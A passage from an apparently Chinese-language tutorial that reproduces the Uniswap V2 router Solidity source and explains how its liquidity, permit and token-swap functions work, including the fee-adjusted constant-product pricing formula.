&#125;\n\n根据恒定k值，应有公式如下\n\n上述为不考虑手续费的情况下，而实际上会收取千分之三的手续费，所以amountIn变成了amountIn*997&#x2F;1000\n代入公式（注意solidity中没有小数，分子分母同时乘以1000）得到如下公式\n\n即代码中实现的计算公式\ngetAmountIn函数逻辑类似\nfunction getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) &#123;\n    require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');\n    amounts = new uint[](path.length);\n    amounts[0] = amountIn;\n    for (uint i; i &lt; path.length - 1; i++) &#123;\n        (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);\n        amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);\n    &#125;\n&#125;\n\ngetAmountsOut函数实现了沿着一个路径进行兑换的功能，比如Token0-&gt;Token1-&gt;Token2-&gt;Token3，并将计算出的amounts以数组形式返回，每次兑换都会调用getAmountOut和getAmountIn函数，所以每次兑换都会扣除手续费，因此兑换路径不宜过长，越长手续费越高。getAmountsIn函数同理\nUniswapV2Router02\nClick to see more\ncontract UniswapV2Router02 is IUniswapV2Router02 &#123;\n    using SafeMath for uint;\n\n    address public immutable override factory;\n    address public immutable override WETH;\n\n    modifier ensure(uint deadline) &#123;\n        require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED');\n        _;\n    &#125;\n\n    constructor(address _factory, address _WETH) public &#123;\n        factory = _factory;\n        WETH = _WETH;\n    &#125;\n\n    receive() external payable &#123;\n        assert(msg.sender == WETH); // only accept ETH via fallback from the WETH contract\n    &#125;\n\n    // **** ADD LIQUIDITY ****\n    function _addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin\n    ) internal virtual returns (uint amountA, uint amountB) &#123;\n        // create the pair if it doesn't exist yet\n        if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) &#123;\n            IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n        &#125;\n        (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n        if (reserveA == 0 &amp;&amp; reserveB == 0) &#123;\n            (amountA, amountB) = (amountADesired, amountBDesired);\n        &#125; else &#123;\n            uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n            if (amountBOptimal &lt;= amountBDesired) &#123;\n                require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n                (amountA, amountB) = (amountADesired, amountBOptimal);\n            &#125; else &#123;\n                uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n                assert(amountAOptimal &lt;= amountADesired);\n                require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n                (amountA, amountB) = (amountAOptimal, amountBDesired);\n            &#125;\n        &#125;\n    &#125;\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) &#123;\n        (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n        TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n        TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n        liquidity = IUniswapV2Pair(pair).mint(to);\n    &#125;\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external virtual override payable ensure(deadline) returns (uint amountToken, uint amountETH, uint liquidity) &#123;\n        (amountToken, amountETH) = _addLiquidity(\n            token,\n            WETH,\n            amountTokenDesired,\n            msg.value,\n            amountTokenMin,\n            amountETHMin\n        );\n        address pair = UniswapV2Library.pairFor(factory, token, WETH);\n        TransferHelper.safeTransferFrom(token, msg.sender, pair, amountToken);\n        IWETH(WETH).deposit&#123;value: amountETH&#125;();\n        assert(IWETH(WETH).transfer(pair, amountETH));\n        liquidity = IUniswapV2Pair(pair).mint(to);\n        // refund dust eth, if any\n        if (msg.value > amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH);\n    &#125;\n\n    // **** REMOVE LIQUIDITY ****\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) public virtual override ensure(deadline) returns (uint amountA, uint amountB) &#123;\n        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n        IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair\n        (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to);\n        (address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB);\n        (amountA, amountB) = tokenA == token0 ? (amount0, amount1) : (amount1, amount0);\n        require(amountA >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n        require(amountB >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n    &#125;\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) public virtual override ensure(deadline) returns (uint amountToken, uint amountETH) &#123;\n        (amountToken, amountETH) = removeLiquidity(\n            token,\n            WETH,\n            liquidity,\n            amountTokenMin,\n            amountETHMin,\n            address(this),\n            deadline\n        );\n        TransferHelper.safeTransfer(token, to, amountToken);\n        IWETH(WETH).withdraw(amountETH);\n        TransferHelper.safeTransferETH(to, amountETH);\n    &#125;\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external virtual override returns (uint amountA, uint amountB) &#123;\n        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n        uint value = approveMax ? uint(-1) : liquidity;\n        IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n        (amountA, amountB) = removeLiquidity(tokenA, tokenB, liquidity, amountAMin, amountBMin, to, deadline);\n    &#125;\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external virtual override returns (uint amountToken, uint amountETH) &#123;\n        address pair = UniswapV2Library.pairFor(factory, token, WETH);\n        uint value = approveMax ? uint(-1) : liquidity;\n        IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n        (amountToken, amountETH) = removeLiquidityETH(token, liquidity, amountTokenMin, amountETHMin, to, deadline);\n    &#125;\n\n    // **** REMOVE LIQUIDITY (supporting fee-on-transfer tokens) ****\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) public virtual override ensure(deadline) returns (uint amountETH) &#123;\n        (, amountETH) = removeLiquidity(\n            token,\n            WETH,\n            liquidity,\n            amountTokenMin,\n            amountETHMin,\n            address(this),\n            deadline\n        );\n        TransferHelper.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));\n        IWETH(WETH).withdraw(amountETH);\n        TransferHelper.safeTransferETH(to, amountETH);\n    &#125;\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external virtual override returns (uint amountETH) &#123;\n        address pair = UniswapV2Library.pairFor(factory, token, WETH);\n        uint value = approveMax ? uint(-1) : liquidity;\n        IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n        amountETH = removeLiquidityETHSupportingFeeOnTransferTokens(\n            token, liquidity, amountTokenMin, amountETHMin, to, deadline\n        );\n    &#125;\n\n    // **** SWAP ****\n    // requires the initial amount to have already been sent to the first pair\n    function _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual &#123;\n        for (uint i; i &lt; path.length - 1; i++) &#123;\n            (address input, address output) = (path[i], path[i + 1]);\n            (address token0,) = UniswapV2Library.sortTokens(input, output);\n            uint amountOut = amounts[i + 1];\n            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));\n            address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\n            IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap(\n                amount0Out, amount1Out, to, new bytes(0)\n            );\n        &#125;\n    &#125;\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123;\n        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, to);\n    &#125;\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123;\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] &lt;= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, to);\n    &#125;\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsOut(factory, msg.value, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        IWETH(WETH).deposit&#123;value: amounts[0]&#125;();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]));\n        _swap(amounts, path, to);\n    &#125;\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] &lt;= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, address(this));\n        IWETH(WETH).withdraw(amounts[amounts.length - 1]);\n        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);\n    &#125;\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, address(this));\n        IWETH(WETH).withdraw(amounts[amounts.length - 1]);\n        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);\n    &#125;\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] &lt;= msg.value, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        IWETH(WETH).deposit&#123;value: amounts[0]&#125;();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]));\n        _swap(amounts, path, to);\n        // refund dust eth, if any\n        if (msg.value > amounts[0]) TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]);\n    &#125;\n\n    // **** SWAP (supporting fee-on-transfer tokens) ****\n    // requires the initial amount to have already been sent to the first pair\n    function _swapSupportingFeeOnTransferTokens(address[] memory path, address _to) internal virtual &#123;\n        for (uint i; i &lt; path.length - 1; i++) &#123;\n            (address input, address output) = (path[i], path[i + 1]);\n            (address token0,) = UniswapV2Library.sortTokens(input, output);\n            IUniswapV2Pair pair = IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output));\n            uint amountInput;\n            uint amountOutput;\n            &#123; // scope to avoid stack too deep errors\n            (uint reserve0, uint reserve1,) = pair.getReserves();\n            (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n            amountInput = IERC20(input).balanceOf(address(pair)).sub(reserveInput);\n            amountOutput = UniswapV2Library.getAmountOut(amountInput, reserveInput, reserveOutput);\n            &#125;\n            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOutput) : (amountOutput, uint(0));\n            address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\n            pair.swap(amount0Out, amount1Out, to, new bytes(0));\n        &#125;\n    &#125;\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) &#123;\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn\n        );\n        uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n        _swapSupportingFeeOnTransferTokens(path, to);\n        require(\n            IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n            'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'\n        );\n    &#125;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    )\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n    &#123;\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        uint amountIn = msg.value;\n        IWETH(WETH).deposit&#123;value: amountIn&#125;();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn));\n        uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n        _swapSupportingFeeOnTransferTokens(path, to);\n        require(\n            IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n            'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'\n        );\n    &#125;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    )\n        external\n        virtual\n        override\n        ensure(deadline)\n    &#123;\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn\n        );\n        _swapSupportingFeeOnTransferTokens(path, address(this));\n        uint amountOut = IERC20(WETH).balanceOf(address(this));\n        require(amountOut >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        IWETH(WETH).withdraw(amountOut);\n        TransferHelper.safeTransferETH(to, amountOut);\n    &#125;\n\n    // **** LIBRARY FUNCTIONS ****\n    function quote(uint amountA, uint reserveA, uint reserveB) public pure virtual override returns (uint amountB) &#123;\n        return UniswapV2Library.quote(amountA, reserveA, reserveB);\n    &#125;\n\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)\n        public\n        pure\n        virtual\n        override\n        returns (uint amountOut)\n    &#123;\n        return UniswapV2Library.getAmountOut(amountIn, reserveIn, reserveOut);\n    &#125;\n\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)\n        public\n        pure\n        virtual\n        override\n        returns (uint amountIn)\n    &#123;\n        return UniswapV2Library.getAmountIn(amountOut, reserveIn, reserveOut);\n    &#125;\n\n    function getAmountsOut(uint amountIn, address[] memory path)\n        public\n        view\n        virtual\n        override\n        returns (uint[] memory amounts)\n    &#123;\n        return UniswapV2Library.getAmountsOut(factory, amountIn, path);\n    &#125;\n\n    function getAmountsIn(uint amountOut, address[] memory path)\n        public\n        view\n        virtual\n        override\n        returns (uint[] memory amounts)\n    &#123;\n        return UniswapV2Library.getAmountsIn(factory, amountOut, path);\n    &#125;\n&#125;\n\n\n\nAnalyze添加流动性：\nfunction _addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint amountADesired,\n    uint amountBDesired,\n    uint amountAMin,\n    uint amountBMin\n) internal virtual returns (uint amountA, uint amountB) &#123;\n    // create the pair if it doesn't exist yet\n    if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) &#123;\n        IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n    &#125;\n    (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n    if (reserveA == 0 &amp;&amp; reserveB == 0) &#123;\n        (amountA, amountB) = (amountADesired, amountBDesired);\n    &#125; else &#123;\n        uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n        if (amountBOptimal &lt;= amountBDesired) &#123;\n            require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n            (amountA, amountB) = (amountADesired, amountBOptimal);\n        &#125; else &#123;\n            uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n            assert(amountAOptimal &lt;= amountADesired);\n            require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n            (amountA, amountB) = (amountAOptimal, amountBDesired);\n        &#125;\n    &#125;\n&#125;\nfunction addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint amountADesired,\n    uint amountBDesired,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline\n) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) &#123;\n    (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n    TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n    liquidity = IUniswapV2Pair(pair).mint(to);\n&#125;\nfunction addLiquidityETH(\n    address token,\n    uint amountTokenDesired,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline\n) external virtual override payable ensure(deadline) returns (uint amountToken, uint amountETH, uint liquidity) &#123;\n    (amountToken, amountETH) = _addLiquidity(\n        token,\n        WETH,\n        amountTokenDesired,\n        msg.value,\n        amountTokenMin,\n        amountETHMin\n    );\n    address pair = UniswapV2Library.pairFor(factory, token, WETH);\n    TransferHelper.safeTransferFrom(token, msg.sender, pair, amountToken);\n    IWETH(WETH).deposit&#123;value: amountETH&#125;();\n    assert(IWETH(WETH).transfer(pair, amountETH));\n    liquidity = IUniswapV2Pair(pair).mint(to);\n    // refund dust eth, if any\n    if (msg.value > amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH);\n&#125;\n\n该部分函数实现了添加流动性功能，支付两种Token换取LP Token，其中addLiquidity和addLiquidityETH函数有所不同，前者支持两种ERC-20Token添加流动性，后者的两个代币中必须有一个为ETH\naddLiquidity参数注释：\ntokenA 和 tokenB 就是配对的两个代币，amountADesired和amountBDesired是预期准备为添加流动性付出的Token数量，amountAMin和amountBMin是用户可以接受的最小交易数量（根据滑点计算），to是LP-Token的接收地址，deadline是这笔交易的有效期，超过有效期还没有交易就会直接失效\naddLiquidity函数调用内部函数_addLiquidity首先检测对应的pair是否存在，如果不存在进行pair创建。获得两种Token的储备量，如果为0，那(amountA, amountB) &#x3D; (amountADesired, amountBDesired)，如果不都为0就计算amountBOptimal，比较是否小于amountBDesired如果小于则需要满足amountBOptimal &gt;&#x3D; amountBMin，此时(amountA, amountB) &#x3D; (amountADesired, amountBOptimal)，如果amountBOptimal &gt; amountBDesired就计算amountAOptimal，要求amountAOptimal &lt;&#x3D; amountADesired并且amountAOptimal &gt;&#x3D; amountAMin否则回滚交易，如果满足，此时的(amountA, amountB) &#x3D; (amountAOptimal, amountBDesired)\n最后再调用pair合约下的的mint函数就可以得到 LP-Token了\naddLiquidityETH与addLiquidity逻辑类似，不过就是将一个ERC-20变成了ETH，。预期支付的 ETH 金额也是直接从 msg.value 读取的，所以入参里也不需要 ETH 的 Desired 参数，实际上这里的ETH也是转变为WETH进行输入的\nIWETH(WETH).deposit&#123;value: amountETH&#125;();\n\n这行代码将用户的ETh转变为了WETH\nif (msg.value > amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH);\n\n将用户付出的多余的ETH进行回退\n移除流动性：\nfunction removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint liquidity,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline\n) public virtual override ensure(deadline) returns (uint amountA, uint amountB) &#123;\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair\n    (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to);\n    (address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB);\n    (amountA, amountB) = tokenA == token0 ? (amount0, amount1) : (amount1, amount0);\n    require(amountA >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n    require(amountB >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n&#125;\nfunction removeLiquidityETH(\n    address token,\n    uint liquidity,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline\n) public virtual override ensure(deadline) returns (uint amountToken, uint amountETH) &#123;\n    (amountToken, amountETH) = removeLiquidity(\n        token,\n        WETH,\n        liquidity,\n        amountTokenMin,\n        amountETHMin,\n        address(this),\n        deadline\n    );\n    TransferHelper.safeTransfer(token, to, amountToken);\n    IWETH(WETH).withdraw(amountETH);\n    TransferHelper.safeTransferETH(to, amountETH);\n&#125;\nfunction removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint liquidity,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline,\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\n) external virtual override returns (uint amountA, uint amountB) &#123;\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    uint value = approveMax ? uint(-1) : liquidity;\n    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n    (amountA, amountB) = removeLiquidity(tokenA, tokenB, liquidity, amountAMin, amountBMin, to, deadline);\n&#125;\nfunction removeLiquidityETHWithPermit(\n    address token,\n    uint liquidity,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline,\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\n) external virtual override returns (uint amountToken, uint amountETH) &#123;\n    address pair = UniswapV2Library.pairFor(factory, token, WETH);\n    uint value = approveMax ? uint(-1) : liquidity;\n    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n    (amountToken, amountETH) = removeLiquidityETH(token, liquidity, amountTokenMin, amountETHMin, to, deadline);\n&#125;\n\n// **** REMOVE LIQUIDITY (supporting fee-on-transfer tokens) ****\nfunction removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint liquidity,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline\n) public virtual override ensure(deadline) returns (uint amountETH) &#123;\n    (, amountETH) = removeLiquidity(\n        token,\n        WETH,\n        liquidity,\n        amountTokenMin,\n        amountETHMin,\n        address(this),\n        deadline\n    );\n    TransferHelper.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));\n    IWETH(WETH).withdraw(amountETH);\n    TransferHelper.safeTransferETH(to, amountETH);\n&#125;\nfunction removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint liquidity,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline,\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\n) external virtual override returns (uint amountETH) &#123;\n    address pair = UniswapV2Library.pairFor(factory, token, WETH);\n    uint value = approveMax ? uint(-1) : liquidity;\n    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n    amountETH = removeLiquidityETHSupportingFeeOnTransferTokens(\n        token, liquidity, amountTokenMin, amountETHMin, to, deadline\n    );\n&#125;\n\nremoveLiquidity和addLiquidity 对应，换回两种Token，removeLiquidityETH和addLiquidityETH ，换回Token和ETH，removeLiquidityWithPermit和removeLiquidityETHWithPermit是使用permit进行签名授权换回Token，后者其中之一为ETH，removeLiquidityETHSupportingFeeOnTransferTokens和removeLiquidityETHWithPermitSupportingFeeOnTransferTokens函数类似，类似于removeLiquidityETH ，不同之处在于支持在转账时支付费用的Token(ERC865)，后者区别前者支持使用链下签名的方式进行授权\n移除流动性的核心代码为removeLiquidity \nfunction removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint liquidity,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline\n) public virtual override ensure(deadline) returns (uint amountA, uint amountB) &#123;\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair\n    (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to);\n    (address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB);\n    (amountA, amountB) = tokenA == token0 ? (amount0, amount1) : (amount1, amount0);\n    require(amountA >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n    require(amountB >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n&#125;\n\n逻辑比较简单，首先将LP-Token划转到pair合约下，在调用burn函数销毁流动性同时归还Token0和Token1，同时返回amountA 和 amountB，然后排序Token0和Token1从而确定amountA 和 amountB，最后检验是否满足滑点计算后的最小值.\nremoveLiquidityETH 同理，因为pair实际存储的是WETH，所以调用removeLiquidity 时第二个参数为wETH，其余逻辑相同，最后调用WETH的withdraw函数将WETH转变为ETH，在调用safeTransferETH将ETh转给to地址\nremoveLiquidityWithPermit函数实际就是在调用removeLiquidity函数钱先调用permit函数进行授权，从而免去调用approve函数的操作，逻辑同上\nremoveLiquidityETHWithPermit函数和removeLiquidityETH 同理，区别于也添加了调用permit函数使用签名进行授权的操作，从而换回Token+ETH\nremoveLiquidityETHSupportingFeeOnTransferTokens和removeLiquidityETHWithPermitSupportingFeeOnTransferTokens函数这里放在一起进行分析逻辑与之前的removeLiquidityETH 和removeLiquidityWithPermit是一样的，前者需要提前进行approve，后者使用permit进行签名验证后调用前者\n代币兑换：\nfunction _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual &#123;\n        for (uint i; i &lt; path.length - 1; i++) &#123;\n            (address input, address output) = (path[i], path[i + 1]);\n            (address token0,) = UniswapV2Library.sortTokens(input, output);\n            uint amountOut = amounts[i + 1];\n            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));\n            address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\n            IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap(\n                amount0Out, amount1Out, to, new bytes(0)\n            );\n        &#125;\n    &#125;\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123;\n        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, to);\n    &#125;\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123;\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] &lt;= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, to);\n    &#125;\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        